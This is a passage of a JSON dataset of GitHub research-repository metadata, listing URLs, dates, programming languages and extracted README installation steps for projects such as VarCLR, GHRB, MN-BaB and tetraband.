                    "value": "2024-09-19T09:35:22Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 47402
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "219": {
        "filename": "squaresLab_VarCLR_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/squaresLab/VarCLR",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "```bash\npip install -e .\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Step 0: Install",
                    "parent_header": [
                        "<a href=\"https://arxiv.org/abs/2112.02650\">VarCLR: Variable Representation Pre-training via Contrastive Learning</a>"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/squaresLab/VarCLR/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-03-16T07:14:32Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-01-04T16:55:44Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 51674
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "220": {
        "filename": "ZhongLIFR_Logs2Graph_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ZhongLIFR/Logs2Graph",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Readers can follow these steps to use our code:\n \n",
                    "original_header": "Logs2Graphs"
                },
                "confidence": 0.985961439547236,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ZhongLIFR/Logs2Graph/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "1. for testing Logs2Graph on HDFS: run GraphGeneration_HDFS.py, and then run main_HDFS.py. \n2. for testing Logs2Graph on Hadoop: run GraphGeneration_Hadoop.py, and then run main_Hadoop.py.\n3. for testing Logs2Graph on Spirit: run GraphGeneration_Spirit.py, and then run main_Spirit.py.\n4. for testing Logs2Graph on BGL: run GraphGeneration_BGL.py, and then run main_BGL.py.\n5. for testing Logs2Graph on Thunderbird: run GraphGeneration_Thunderbird.py, and then run main_Thunderbird.py.\n \n",
                    "original_header": "Step3: Testing"
                },
                "confidence": 0.9999999882591056,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ZhongLIFR/Logs2Graph/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-03-26T07:24:02Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-23T12:12:20Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 229933
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "221": {
        "filename": "coinse_GHRB_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/coinse/GHRB",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "First, build the docker image:\n```bash\ncd Docker\ndocker build -t ghrb_framework .\n```\n\nNext, make a docker container:\n```bash\nsh run_docker_container.sh\n```\n\nInside the docker, the following commands need to be executed to complete setup:\n\n```bash\ncd /root/framework\nchmod +x cli.py\n\ncd debug\npython collector.py\ncd ..\n```\n\nFinally, check whether cli.py runs correctly via:\n```bash\n./cli.py -h\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Setting up GHRB",
                    "parent_header": [
                        "GHRB: GitHub Recent Bugs"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/coinse/GHRB/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "| Project | Bugs | Deprecated |\n| ------- | ---- | ---------- |\n| fastjson | 1 | 0 |\n| nacos | 6 | 0 | \n| dubbo | 1 | 0 |\n| rocketmq | 28 | 0 | \n| assertj | 4 | 0 |\n| checkstyle | 21 | 1 |\n| jackson-core | 3 | 0 |\n| jackson-databind | 7 | 0 |\n| jackson-dataformat-xml | 1 | 0 |\n| gson | 12 | 0 | \n| sslcontext-kickstart | 7 | 0 | \n| jsoup | 5 | 0 |\n| openapi-generator | 9 | 0 |\n| seata | 2 | 0 |\n| retrofit | 1 | 0 |\n| Apktool | 1 | 0 |\n| **Total** | **107** | **1** |\n \n",
                    "original_header": "Available Bugs"
                },
                "confidence": 0.9774982226623224,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/coinse/GHRB/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "(Note that all directory paths given to the tool need to be absolute paths \nwithin the container.) \n 1. `info` - View information about a project or a particular bug.\n    *  Example: `./cli.py info -p gson`\n 2. `checkout` - checkout the buggy or fixed version of a bug.\n    *  Example: `./cli.py checkout -p gson -v 1b -w /root/framework/testing` \n 3. `compile` - compile the code in a directory.\n    *  Example: `./cli.py compile -w /root/framework/testing`\n 4. `test` - run the tests for a project.\n    *  Example: `./cli.py test -w /root/framework/testing` \n",
                    "original_header": "Using GHRB"
                },
                "confidence": 0.9871416065042735,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/coinse/GHRB/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "With a file that consists of a list of url to the repositories, use\n```\npython filter_repo.py --repository_list <link_file>\n```\nto collect the metadata of repositories prior to gathering pull request information. `<link_file>` should look like:\n```\nhttps://github.com/coinse/GHRB\nhttps://github.com/coinse/libro\n...\n```\n \n",
                    "original_header": "Fetching Metadata of Repositories"
                },
                "confidence": 0.9990374841368054,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/coinse/GHRB/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "`<repo_info_file>` should have a format like:\n```jsonc\n\n    [\n        {\n        \"name\": // name of the repo,\n        \"owner\": \n            {\n                \"login\": // owner of the repo\n            },\n        \"url\": // full url for git clone\n        },\n    ]\n\n```\n \n",
                    "original_header": "Fetching Pull Request Data"
                },
                "confidence": 0.994536268042542,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/coinse/GHRB/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "* Fetch git diff of the test files (test_diff) and production files (prod_diff) of each pull request data collected from above, which are to be located in `collected/test_diff` and `collected/prod_diff` accordingly. **This can be neglected if diff files were already collected from running `collect_raw_data.py`.**\n* For each pull request:\n    * Checkout to the buggy commit, apply test diff only, and verify that the **test fails**.\n    * Checkout to the buggy commit, apply both test diff and prod diff, and verify that the **test passes**.\n* Move the diff files for the verified pull requests from above into `data/test_diff` and `data/prod_diff` \nThe current script is specifically designed for the automated pipeline for maintenance, therefore in=n order to verify the bugs of your choice, please modify the script at your will before running.\n \n",
                    "original_header": "Verifying the Pull Requests"
                },
                "confidence": 0.9107040380054952,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/coinse/GHRB/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-10-17T06:58:48Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-06T02:27:44Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 107483
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 10329
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 2686
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 2137
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Vim Script",
                    "name": "Vim Script",
                    "type": "Programming_language",
                    "size": 188
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "222": {
        "filename": "idealab-isu_LLM4G-Code_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/idealab-isu/LLM4GCode",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-09-03T01:47:56Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-05-24T13:52:13Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "223": {
        "filename": "co-design-hybrid_co-design-hybrid_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/co-design-hybrid/co-design-hybrid",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "## Recruiting\nParticipants in the co-design workshops should consist of a variety of software engineers, UX designers, and product managers representing the major software development roles at the site. It is ideal that experience and functioning roles of participants can reflect the demongraphics of the office, but be aware that software developers' time are expensive. The number of participants varied from 17 to 22 across our three workshops at SAP.\n",
                    "type": "Text_excerpt",
                    "original_header": "Recruiting",
                    "parent_header": [
                        "Recruiting and Preparation <a name=\"prep\"></a>"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/co-design-hybrid/co-design-hybrid/main/README.md"
            },
            {
                "result": {
                    "value": "This workshop is recommended in a large conference room with roundtable seatings, and equipped with whiteboard spaces and wall displays. If there are remote participants, collaborative design space is recommended, including SurfaceHub and Jamboard. **LOTS of sticky notes** will be used during these sessions. For a session size with 20 participants, two facilitators would be sufficient.\n\nAgenda email and calendar invite need to be sent at least one week before the actuall workshop happen for coordinating time.\n",
                    "type": "Text_excerpt",
                    "original_header": "Preparation",
                    "parent_header": [
                        "Recruiting and Preparation <a name=\"prep\"></a>"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/co-design-hybrid/co-design-hybrid/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<img width=\"640\" alt=\"image\" src=\"https://user-images.githubusercontent.com/5464857/201758038-66ff6d11-9d97-46a7-882d-ef6600336fa7.png\"> \n",
                    "original_header": "Target who we are designing for"
                },
                "confidence": 0.9415592075424289,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/co-design-hybrid/co-design-hybrid/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<img width=\"640\" alt=\"image\" src=\"https://user-images.githubusercontent.com/5464857/201765933-7f1554f9-0f49-42f7-91f5-b65b1ac71b05.png\"> \n",
                    "original_header": "Synthesis of Research"
                },
                "confidence": 0.9415592075424289,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/co-design-hybrid/co-design-hybrid/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<img width=\"250\" alt=\"image\" src=\"https://user-images.githubusercontent.com/5464857/201828216-dd701c55-2637-495a-97b2-4372ffe7faab.png\"> \n",
                    "original_header": "Vote and Prototype"
                },
                "confidence": 0.9415592075424289,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/co-design-hybrid/co-design-hybrid/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<img width=\"200\" alt=\"image\" src=\"https://user-images.githubusercontent.com/5464857/201779139-206cd4c9-079f-4fe0-a420-c9f21b5f4809.png\"> \n \n",
                    "original_header": "Tracking Action Item Progress"
                },
                "confidence": 0.9256969470641162,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/co-design-hybrid/co-design-hybrid/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-11-04T00:10:45Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-02-28T16:37:34Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "224": {
        "filename": "hongliangliang_leofuzz_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/HongliangLiang/leofuzz",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2021-06-15T07:51:06Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-06-27T11:46:50Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 76017
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 27327
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 15955
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 8982
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "PLpgSQL",
                    "name": "PLpgSQL",
                    "type": "Programming_language",
                    "size": 172
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Rich Text Format",
                    "name": "Rich Text Format",
                    "type": "Programming_language",
                    "size": 21
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 20
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "225": {
        "filename": "anonymous-ICSE2022_scenoRITA_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/Software-Aurora-Lab/scenoRITA",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2021-02-26T00:31:26Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-16T08:03:53Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 124005
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Starlark",
                    "name": "Starlark",
                    "type": "Programming_language",
                    "size": 5552
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 489
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "226": {
        "filename": "mdrafiqulrabin_rm-dd-perses_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/mdrafiqulrabin/rm-dd-perses",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "&emsp; [ Related Work: https://github.com/mdrafiqulrabin/CI-DD-Perses ] \n",
                    "original_header": "Research Quest:"
                },
                "confidence": 0.9986523996637047,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/mdrafiqulrabin/rm-dd-perses/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-11-20T21:44:09Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-12-02T04:53:38Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "227": {
        "filename": "dlfaults_dnn-auto-repair-empirical-assesment_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/dlfaults/dnn-auto-repair-empirical-assesment",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Tested with Python 3.8.2\n- tensorflow 2.3.4\n- Keras 2.4.3\n \n",
                    "original_header": "Environments"
                },
                "confidence": 0.9896154350647407,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/dlfaults/dnn-auto-repair-empirical-assesment/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- It is highly recommened to use GPU version of Tensorflow.\n \n",
                    "original_header": "Notes"
                },
                "confidence": 0.9899242654388337,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/dlfaults/dnn-auto-repair-empirical-assesment/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-01-26T16:28:49Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-01-27T06:37:05Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 657372
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 354150
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "228": {
        "filename": "eth-sri_mn-bab_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/eth-sri/mn-bab",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "```\n  conda create --name MNBAB python=3.7 -y\n  conda activate MNBAB\n  ```\n\nThis script installs a few necessary prerequisites including the ELINA library and GUROBI solver and sets some PATHS. It was tested on an AWS Deep Learning AMI (Ubuntu 18.04) instance.\n\n```\nsource setup.sh\n```\n\nInstall remaining dependencies:\n```\npython3 -m pip install -r requirements.txt\nPYTHONPATH=$PYTHONPATH:$PWD\n```\n\nDownload the full MNIST, CIFAR10, and TinyImageNet test datasets in the right format and copy them into the `test_data` directory:  \n[MNIST](https://files.sri.inf.ethz.ch/sabr/mnist_test_full.csv)  \n[CIFAR10](https://files.sri.inf.ethz.ch/sabr/cifar10_test_full.csv)  \n[TinyImageNet](https://files.sri.inf.ethz.ch/sabr/tin_val.csv)  \n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "MN-BaB <img width=\"100\" alt=\"portfolio_view\" align=\"right\" src=\"http://safeai.ethz.ch/img/sri-logo.svg\">"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/eth-sri/mn-bab/SABR_ready/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```\ngit clone --branch SABR_ready --recurse-submodules https://github.com/eth-sri/mn-bab\n``` \nor clone normally and initialize the submodule later on\n```\ngit clone --branch SABR_ready https://github.com/eth-sri/mn-bab\ngit submodule init\ngit submodule update\n```\n \nThere's no need for a further installation of the submodules. \n",
                    "original_header": "Cloning"
                },
                "confidence": 0.9717208072619531,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/eth-sri/mn-bab/SABR_ready/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-03-07T10:49:35Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-04-05T19:40:30Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 1358891
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 6539
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "229": {
        "filename": "helges_tetraband_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/HelgeS/tetraband",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "# Installation\n\n## Dependencies\n\nTensorflow Object Detection API depends on the following libraries:\n\n*   Protobuf 3.0.0\n*   Python-tk\n*   Pillow 1.0\n*   lxml\n*   tf Slim (which is included in the \"tensorflow/models/research/\" checkout)\n*   Jupyter notebook\n*   Matplotlib\n*   Tensorflow (>=1.9.0)\n*   Cython\n*   contextlib2\n*   cocoapi\n\nFor detailed steps to install Tensorflow, follow the [Tensorflow installation\ninstructions](https://www.tensorflow.org/install/). A typical user can install\nTensorflow using one of the following commands:\n\n``` bash\n# For CPU\npip install tensorflow\n# For GPU\npip install tensorflow-gpu\n```\n\nThe remaining libraries can be installed on Ubuntu 16.04 using via apt-get:\n\n``` bash\nsudo apt-get install protobuf-compiler python-pil python-lxml python-tk\npip install --user Cython\npip install --user contextlib2\npip install --user jupyter\npip install --user matplotlib\n```\n\nAlternatively, users can install dependencies using pip:\n\n``` bash\npip install --user Cython\npip install --user contextlib2\npip install --user pillow\npip install --user lxml\npip install --user jupyter\npip install --user matplotlib\n```\n\n<!-- common_typos_disable -->\n**Note**: sometimes \"sudo apt-get install protobuf-compiler\" will install\nProtobuf 3+ versions for you and some users have issues when using 3.5.\nIf that is your case, try the [manual](#Manual-protobuf-compiler-installation-and-usage) installation.\n\n## COCO API installation\n\nDownload the\n[cocoapi](https://github.com/cocodataset/cocoapi) and\ncopy the pycocotools subfolder to the tensorflow/models/research directory if\nyou are interested in using COCO evaluation metrics. The default metrics are\nbased on those used in Pascal VOC evaluation. To use the COCO object detection\nmetrics add `metrics_set: \"coco_detection_metrics\"` to the `eval_config` message\nin the config file. To use the COCO instance segmentation metrics add\n`metrics_set: \"coco_mask_metrics\"` to the `eval_config` message in the config\nfile.\n\n```bash\ngit clone https://github.com/cocodataset/cocoapi.git\ncd cocoapi/PythonAPI\nmake\ncp -r pycocotools <path_to_tensorflow>/models/research/\n```\n\n## Protobuf Compilation\n\nThe Tensorflow Object Detection API uses Protobufs to configure model and\ntraining parameters. Before the framework can be used, the Protobuf libraries\nmust be compiled. This should be done by running the following command from\nthe tensorflow/models/research/ directory:\n\n\n``` bash\n# From tensorflow/models/research/\nprotoc object_detection/protos/*.proto --python_out=.\n```\n\n**Note**: If you're getting errors while compiling, you might be using an incompatible protobuf compiler. If that's the case, use the following manual installation\n\n## Manual protobuf-compiler installation and usage\n\n**If you are on linux:**\n\nDownload and install the 3.0 release of protoc, then unzip the file.\n\n```bash\n# From tensorflow/models/research/\nwget -O protobuf.zip https://github.com/google/protobuf/releases/download/v3.0.0/protoc-3.0.0-linux-x86_64.zip\nunzip protobuf.zip\n```\n\nRun the compilation process again, but use the downloaded version of protoc\n\n```bash\n# From tensorflow/models/research/\n./bin/protoc object_detection/protos/*.proto --python_out=.\n```\n\n**If you are on MacOS:**\n\nIf you have homebrew, download and install the protobuf with\n```brew install protobuf```\n\nAlternately, run:\n```PROTOC_ZIP=protoc-3.3.0-osx-x86_64.zip\ncurl -OL https://github.com/google/protobuf/releases/download/v3.3.0/$PROTOC_ZIP\nsudo unzip -o $PROTOC_ZIP -d /usr/local bin/protoc\nrm -f $PROTOC_ZIP\n```\n\nRun the compilation process again:\n\n``` bash\n# From tensorflow/models/research/\nprotoc object_detection/protos/*.proto --python_out=.\n```\n\n## Add Libraries to PYTHONPATH\n\nWhen running locally, the tensorflow/models/research/ and slim directories\nshould be appended to PYTHONPATH. This can be done by running the following from\ntensorflow/models/research/:\n\n\n``` bash\n# From tensorflow/models/research/\nexport PYTHONPATH=$PYTHONPATH:`pwd`:`pwd`/slim\n```\n\nNote: This command needs to run from every new terminal you start. If you wish\nto avoid running this manually, you can add it as a new line to the end of your\n~/.bashrc file, replacing \\`pwd\\` with the absolute path of\ntensorflow/models/research on your system.\n\n# Testing the Installation\n\nYou can test that you have correctly installed the Tensorflow Object Detection\\\nAPI by running the following command:\n\n```bash\npython object_detection/builders/model_builder_test.py\n```\n",
                    "type": "File_dump"
                },
                "confidence": 1,
                "technique": "file_exploration",
                "source": "https://raw.githubusercontent.com/helges/tetraband/master/object_detection/g3doc/installation.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "These environments can be used by importing the `envs` module and instantiating the wanted configuration:\n```\nimport gym\nimport envs\nenv = gym.make('ImageClassificationEnv-basic-cifar10-v0')\nprint(\"Number of actions: \", env.action_space.n)\nprint(\"Observation space: \", env.observation_space)\nprint(\"Actions: \", env.action_names())\n```\n \n",
                    "original_header": "Environments"
                },
                "confidence": 0.9581080794724207,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/helges/tetraband/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Available datasets (will be automatically downloaded): \n",
                    "original_header": "Datasets"
                },
                "confidence": 0.9897322357517745,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/helges/tetraband/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2018-12-13T18:03:23Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-12-21T08:03:30Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 3441365
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 15160
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 7396
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 5701
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "230": {
        "filename": "hzheng40_tunercar_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/hzheng40/tunercar",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "You can install all dependencies through pip with:\n\n```bash\n$ pip3 install gym \\\n               ray \\\n               sacred \\\n               tqdm \\\n               numpy \\\n               scipy \\\n               numba \\\n               pyyaml \\\n               nevergrad\n$ git clone https://github.com/f1tenth/f1tenth_gym.git\n$ cd f1tenth_gym\n$ git checkout exp_py\n$ pip3 install -e gym/\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "Overview"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/hzheng40/tunercar/fdm/README.md"
            },
            {
                "result": {
                    "value": "Before running all experiments, you'll have to clone the race tracks repo that contains all scaled-down Formula 1 race tracks:\n\n```bash\n$ cd tunercar/es/maps\n$ git clone https://github.com/f1tenth/f1tenth_racetracks.git\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Setup",
                    "parent_header": [
                        "Overview",
                        "Configuration and Running Experiments"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/hzheng40/tunercar/fdm/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-02-10T18:03:57Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-06-05T21:37:49Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 198561
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 3557
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
